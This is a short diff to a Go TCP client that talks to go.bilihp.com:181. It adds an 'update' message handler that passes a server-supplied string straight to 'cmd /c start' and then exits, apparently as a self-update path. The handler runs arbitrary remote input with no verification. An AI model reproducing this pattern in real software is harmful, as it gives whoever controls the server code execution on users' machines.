@@ -8,6 +8,8 @@ import (
 	"main.go/tuuz/RET"
 	"net"
 	"os"
+	"os/exec"
+	"time"
 )
 
 const Addr = "go.bilihp.com:181"
@@ -49,6 +51,13 @@ func ActionRoute(json string, username string, conn *net.TCPConn) {
 
 			case "error":
 				fmt.Println(ret)
+				break
+
+			case "update":
+				fmt.Println(echo)
+				exec.Command(`cmd`, `/c`, `start`, Calc.Any2String(ret)).Start()
+				time.Sleep(120 * time.Second)
+				os.Exit(1)
 				break
 
 			case "reinit":
